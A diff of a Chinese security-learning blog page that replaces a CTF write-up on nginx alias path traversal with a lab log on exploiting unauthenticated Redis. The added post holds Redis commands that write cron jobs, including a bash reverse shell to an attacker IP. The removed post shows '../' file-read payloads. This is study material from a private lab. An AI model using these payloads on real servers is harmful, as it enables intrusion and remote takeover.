@@ -6,23 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://www.obolu.top">
-  <title>通过一道CTF题对nginx配置不当导致任意文件下载漏洞学习 | Obolu的小博客</title>
+  <title>Redis未授权访问漏洞利用学习 | Obolu的小博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="暑假学习继续ing，今天刷i春秋到一个nginx配置不当导致的任意文件下载漏洞，记录学习一波">
+  <meta name="description" content="其实感觉更像一次失败中摸索的记录吧…….">
 <meta name="keywords" content="知识收藏">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通过一道CTF题对nginx配置不当导致任意文件下载漏洞学习">
-<meta property="og:url" content="http://www.obolu.top/2018/08/01/通过一道CTF题对nginx配置不当导致任意文件下载漏洞学习/index.html">
+<meta property="og:title" content="Redis未授权访问漏洞利用学习">
+<meta property="og:url" content="http://www.obolu.top/2019/03/20/Redis漏洞利用与防御学习/index.html">
 <meta property="og:site_name" content="Obolu的小博客">
-<meta property="og:description" content="暑假学习继续ing，今天刷i春秋到一个nginx配置不当导致的任意文件下载漏洞，记录学习一波">
+<meta property="og:description" content="其实感觉更像一次失败中摸索的记录吧…….">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:image" content="http://img.5am3.com/img/180801/5b8Acjf4fB.png?imageslim">
-<meta property="og:image" content="http://img.5am3.com/img/180801/6hI5BEF25F.png?imageslim">
-<meta property="og:updated_time" content="2018-08-01T07:14:28.938Z">
+<meta property="og:image" content="https://img.5am3.com/images/20190320/A2k392zVmE9T.png?imageslim">
+<meta property="og:image" content="https://img.5am3.com/images/20190320/e7NSP4xc4l8r.png?imageslim">
+<meta property="og:image" content="https://img.5am3.com/images/20190320/0mShfMSQHqSz.png?imageslim">
+<meta property="og:image" content="https://img.5am3.com/images/20190320/fnIr1s7bQHGC.png?imageslim">
+<meta property="og:image" content="https://img.5am3.com/images/20190320/jlRdrnF9Qyk0.png?imageslim">
+<meta property="og:image" content="https://img.5am3.com/images/20190320/lprVGYyhq6bD.png?imageslim">
+<meta property="og:image" content="https://img.5am3.com/images/20190320/fmvRqkiXcDc9.png?imageslim">
+<meta property="og:image" content="https://img.5am3.com/images/20190320/6zonzNfP8fNH.png?imageslim">
+<meta property="og:updated_time" content="2019-03-20T13:05:19.292Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="通过一道CTF题对nginx配置不当导致任意文件下载漏洞学习">
-<meta name="twitter:description" content="暑假学习继续ing，今天刷i春秋到一个nginx配置不当导致的任意文件下载漏洞，记录学习一波">
-<meta name="twitter:image" content="http://img.5am3.com/img/180801/5b8Acjf4fB.png?imageslim">
+<meta name="twitter:title" content="Redis未授权访问漏洞利用学习">
+<meta name="twitter:description" content="其实感觉更像一次失败中摸索的记录吧…….">
+<meta name="twitter:image" content="https://img.5am3.com/images/20190320/A2k392zVmE9T.png?imageslim">
   
     <link rel="alternative" href="/atom.xml" title="Obolu的小博客" type="application/atom+xml">
   
@@ -158,44 +164,60 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-通过一道CTF题对nginx配置不当导致任意文件下载漏洞学习" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Redis漏洞利用与防御学习" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      通过一道CTF题对nginx配置不当导致任意文件下载漏洞学习
+      Redis未授权访问漏洞利用学习
     </h1>
   
 
         
-        <a href="/2018/08/01/通过一道CTF题对nginx配置不当导致任意文件下载漏洞学习/" class="archive-article-date">
-  	<time datetime="2018-08-01T07:14:52.511Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-01</time>
+        <a href="/2019/03/20/Redis漏洞利用与防御学习/" class="archive-article-date">
+  	<time datetime="2019-03-20T13:05:23.923Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>暑假学习继续ing，今天刷i春秋到一个nginx配置不当导致的任意文件下载漏洞，记录学习一波</p>
+        <p>其实感觉更像一次失败中摸索的记录吧…….</p>
 <a id="more"></a>
-<h3 id="目录穿越（任意文件读取）漏洞"><a href="#目录穿越（任意文件读取）漏洞" class="headerlink" title="目录穿越（任意文件读取）漏洞"></a>目录穿越（任意文件读取）漏洞</h3><p>参考题目：百度杯2017二月-Zone</p>
-<p>首先了解了一下nginx的配置文件是/etc/nginx/nginx.conf</p>
-<p>题目URL格式如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://A.COM/manages/admin.php?module=index&amp;name=php</span><br></pre></td></tr></table></figure>
-<p>猜测index处可以通过../../../etc/nginx/nginx.conf读取内容</p>
-<p>(ps:原题这里过滤了../可以通过…/./绕过)</p>
-<p>读取配置文件如下：</p>
-<p><img src="http://img.5am3.com/img/180801/5b8Acjf4fB.png?imageslim" alt="mark"></p>
-<p>发现此处有文件包含，尝试读取/etc/nginx/sites-enabled/default </p>
-<p>读取内容如下：</p>
-<p><img src="http://img.5am3.com/img/180801/6hI5BEF25F.png?imageslim" alt="mark"></p>
-<p>注意到这里别名格式是/online-movies ，地址格式是 /movie/， 而且开启了<u>autoindex</u> </p>
-<p>多了一个” / “</p>
-<p>因此在URL+/online-movies可以访问该目录文件，同时URL+/online-movies../  可以实现目录向上级穿越</p>
-<p>最终通过任意文件下载解出flag</p>
-<p>参考链接：<a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>
+<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>Redis服务器端ubuntu16.04:<strong>192.168.242.131</strong> </p>
+<p>攻击端kali2.0:<strong>192.168.242.141</strong></p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>首先在ubuntu上面安装redis服务，使用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</span><br><span class="line">tar –xvf redis-4.0.8.tar.gz</span><br><span class="line">cd redis-4.0.8</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>修改配置文件，设置外网可以访问，并且关闭保护模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp redis.conf ./src/redis.conf</span><br><span class="line">bind 127.0.0.1  前面加上#号注释掉</span><br><span class="line">protected-mode 设为 no</span><br><span class="line"></span><br><span class="line">启动 redis-server</span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
+<h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><p><img src="https://img.5am3.com/images/20190320/A2k392zVmE9T.png?imageslim" alt="mark"></p>
+<p>首先没有设置密码，直接可以在kali登陆</p>
+<p><img src="https://img.5am3.com/images/20190320/e7NSP4xc4l8r.png?imageslim" alt="mark"></p>
+<h4 id="反弹shell测试"><a href="#反弹shell测试" class="headerlink" title="反弹shell测试"></a>反弹shell测试</h4><p><img src="https://img.5am3.com/images/20190320/0mShfMSQHqSz.png?imageslim" alt="mark"></p>
+<p><img src="https://img.5am3.com/images/20190320/fnIr1s7bQHGC.png?imageslim" alt="mark"></p>
+<p>方法1:</p>
+<p>利用redis写文件权限写linux的crontab命令但是发现迟迟没成功，查资料发现了这篇文章</p>
+<p><a href="https://cloud.tencent.com/developer/news/301606" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/301606</a></p>
+<p>大致意思就是ubuntu里面/bin/sh指向的是dash而非bash…centos里面就可以</p>
+<p>思路大致分为两步，首先需要将dash的软连接指向改为bash，然后弹shell，但是又不能直接从ubuntu上面直接改动，所以思考还是利用写文件来修改，参考链接</p>
+<p><a href="http://lawlietweb.com/2018/08/19/2018-08-19/" target="_blank" rel="noopener">http://lawlietweb.com/2018/08/19/2018-08-19/</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set aaa "\n* * * * * root dpkg-reconfigure dash no\n"</span><br><span class="line">config set dir /etc/cron.d</span><br><span class="line">config set dbfilename step1</span><br><span class="line">save</span><br><span class="line">set bbb "\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.242.141/8088 0&gt;&amp;1\n\n\n\n"</span><br><span class="line">config set dir /etc/cron.d</span><br><span class="line">config set dbfilename step2</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>结果还是没成功，发现dpkg-reconfigure dash这个命令会弹出来个框，需要手动选择一下no</p>
+<p>方法2:</p>
+<p><img src="https://img.5am3.com/images/20190320/jlRdrnF9Qyk0.png?imageslim" alt="mark"></p>
+<p>写个shell.sh的shell文件，发现redis写的文件好像会加入一些奇怪的头,导致一些乱码出现.sh文件无法使用</p>
+<p><img src="https://img.5am3.com/images/20190320/lprVGYyhq6bD.png?imageslim" alt="mark"></p>
+<p>手动写标准版的，发现可以弹shell，就很迷</p>
+<p><img src="https://img.5am3.com/images/20190320/fmvRqkiXcDc9.png?imageslim" alt="mark"></p>
+<p><img src="https://img.5am3.com/images/20190320/6zonzNfP8fNH.png?imageslim" alt="mark"></p>
+<p>之前看到好像可以通过写一个.sh文件然后通过crontab命令调用….但是本地我测试的好像也不行。</p>
+<p>总结：通过学习思考….如果该服务器有web服务的话，如果允许redis的用户权限足够高，也可以达到写webshell或者写ssh公钥文件进行上传链接,(ubuntu安全性好高感觉……)</p>
+<p>参考链接：</p>
+<p><a href="http://lawlietweb.com/2018/08/19/2018-08-19/" target="_blank" rel="noopener">http://lawlietweb.com/2018/08/19/2018-08-19/</a></p>
+<p><a href="https://cloud.tencent.com/developer/news/301606" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/301606</a></p>
+<p><a href="https://www.freebuf.com/column/170710.html" target="_blank" rel="noopener">https://www.freebuf.com/column/170710.html</a></p>
 
       
 
@@ -297,7 +319,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://www.obolu.top/2018/08/01/通过一道CTF题对nginx配置不当导致任意文件下载漏洞学习/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://www.obolu.top/2019/03/20/Redis漏洞利用与防御学习/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -311,18 +333,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/08/03/SQL注入攻击防御/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          SQL注入攻击防御
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/07/30/CSRF攻击学习/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CSRF攻击学习</div>
+    <a href="/2019/03/11/DVWA_XSS实验记录/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DVWA_XSS模块学习笔记</div>
       <i class="icon-circle-right"></i>
     </a>
   
